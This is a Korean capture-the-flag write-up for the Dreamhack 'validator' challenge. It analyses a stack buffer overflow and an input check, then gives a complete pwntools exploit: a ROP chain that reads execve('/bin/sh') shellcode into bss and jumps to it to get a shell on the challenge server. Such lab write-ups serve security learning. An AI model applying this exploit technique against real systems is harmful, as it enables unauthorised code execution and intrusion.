dreamhack validator
============

## 1. 보호 기법 확인

<img width="811" height="241" alt="image" src="https://github.com/user-attachments/assets/0c411c0f-d011-4e7c-b0e6-a7de4f3667a6" />

모든 보호 기법이 꺼져있다.


## 2. 코드 분석

<img width="640" height="203" alt="image" src="https://github.com/user-attachments/assets/35fea755-538f-4612-8366-1cbb772c0536" />

* `read(0, s, 0x400)`때문에 버퍼 오버플로우가 발생한다.
* `validate(s, 128)` 함수를 호출한다.


---------------

<img width="723" height="355" alt="image" src="https://github.com/user-attachments/assets/67aca9a4-f2ba-4650-b5a5-b48862457331" />

* 문자열의 처음 열 글자는 DREAMHACK!이어야한다.
* 문자열의 12번째 글자부터 128번째 글자 까지는 s[i] = s[i+1] + 1 이어야 한다.
* 마지막 128번째 글자는 129번째 글자와 비교해서 s[i] = s[i+1] + 1 조건을 만족해야 한다.




## 3. 익스플로잇

NX 보호 기법이 꺼져 있어서 쉘 코드를 사용할 수 있다. 문제에서 주어진 커널 버전으로는 NX 비활성화 시 읽기 권한이 있는 메모리에 실행 권한이 존재하므로 
bss(Beginning of Symbol Segment) 영역에서 쉘 코드를 쓰고 ret를 bss 주소로 변조하는 방법을 사용할 수 있다.   

또 validator_server의 조건을 확인하면 큰 숫자부터 내림차순으로 1바이트씩 payload에 추가하는 방식으로 작성할 수 있다는 것을 짐작할 수 있다.

### 오프셋 구하기

<img width="793" height="508" alt="image" src="https://github.com/user-attachments/assets/cf7242a8-61b3-4839-94ef-9b06cc4819c5" />


```
   0x0000000000400658 <+30>:    lea    rax,[rbp-0x80]		    # rax = s
   0x000000000040065c <+34>:    mov    edx,0x400		        # edx = 0x400 
   0x0000000000400661 <+39>:    mov    rsi,rax				      # rsi = s
   0x0000000000400664 <+42>:    mov    edi,0x0				      # edi = 0
   0x0000000000400669 <+47>:    call   0x400470 <read@plt>	# read(0, s, 0x400)
   0x000000000040066e <+52>:    lea    rax,[rbp-0x80]
```

### 익스플로잇 코드

```
from pwn import *

p = remote("host8.dreamhack.games", 9383)
e = ELF("validator_server")
r = ROP(e)

context.arch = "amd64"

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))

read_plt = e.plt["read"]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
bss = e.bss()

payload = b"DREAMHACK!"
list = []

for i in range(118, -1, -1):
        list.append(i)

payload += bytes(list)
payload += b"B"*7

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(len(shellcode)+1)
payload += p64(read_plt)

payload += p64(bss)

sleep(0.5)
p.send(payload)
sleep(0.5)
p.send(shellcode)

p.interactive()
```


### 실행 결과

<img width="1038" height="456" alt="image" src="https://github.com/user-attachments/assets/61462b65-0bc0-4e1d-8b19-fc4ed2315f63" />





